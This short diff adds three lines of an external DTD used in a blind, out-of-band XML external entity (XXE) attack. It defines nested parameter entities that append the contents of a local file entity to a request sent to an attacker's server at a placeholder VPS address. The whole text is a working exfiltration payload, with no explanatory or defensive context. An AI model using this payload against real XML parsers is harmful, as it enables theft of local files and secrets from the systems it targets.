@@ -1,0 +1,3 @@
+<!ENTITY % dtd "<!ENTITY &#x25; xxe  SYSTEM 'http://[vps-ip]/1.php?file=%file;'> ">
+%dtd;
+%xxe;
